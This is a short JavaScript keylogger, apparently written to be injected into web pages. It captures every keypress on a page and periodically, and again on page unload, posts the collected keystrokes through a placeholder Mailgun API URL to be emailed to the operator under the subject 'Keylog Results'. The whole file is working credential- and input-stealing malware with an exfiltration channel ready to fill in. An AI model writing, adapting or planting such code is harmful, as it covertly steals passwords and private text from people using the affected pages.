(function() {
    // Load the script
    var script = document.createElement("SCRIPT");
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js';
    script.type = 'text/javascript';
    document.getElementsByTagName("head")[0].appendChild(script);

    // Poll for jQuery to come into existance
    var checkReady = function(callback) {
        if (window.jQuery) {
            callback(jQuery);
        }
        else {
            window.setTimeout(function() { checkReady(callback); }, 100);
        }
    };

    // Start polling...
    checkReady(function($) { 
        console.log("jquery ready"); 
        document.addEventListener('keypress', function (e) {
            console.log("keypress")
            e = e || window.event;
            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
            if (charCode) {
                log(String.fromCharCode(charCode));
            }
        });

        data = []

        function log(input) {
            console.log("Logged", input);
            data.push(input);
        }

        function save() {
            sendMail(data);
        }

        window.onbeforeunload = function() {
            save();
        }

        // Save every second
        setInterval(function(){
            save();
        }, 60000);

        function sendMail(data) {
            $.ajax({
              type: 'POST',
              crossDomain: true,
              url: "YOUR MAILGUN API URL",
              data: {
                from: "FROM",
                to: "YOUR EMAIL ADDRESS",
                subject: "Keylog Results",
                text: data.join("")
              }
             }).done(function(response) {
               console.log(response); // if you're into that sorta thing
             });
        }
    });
})();